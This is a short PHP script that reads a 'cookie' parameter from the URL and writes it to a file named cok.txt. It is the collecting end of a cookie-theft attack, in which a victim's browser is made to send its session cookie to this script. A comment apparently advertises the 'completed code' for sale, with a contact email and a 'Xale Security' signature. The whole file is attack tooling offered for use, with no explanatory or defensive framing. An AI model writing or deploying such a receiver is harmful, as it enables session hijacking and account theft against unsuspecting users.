<?php
session_start();
$a = $_GET['cookie'];
#
#
#
#
# Completed code is sell / Contact ; xaledef@protonmail.com
$file = fopen("cok.txt", "w");
echo fwrite($file, $a);
fclose($file);

# Xale Security

?>
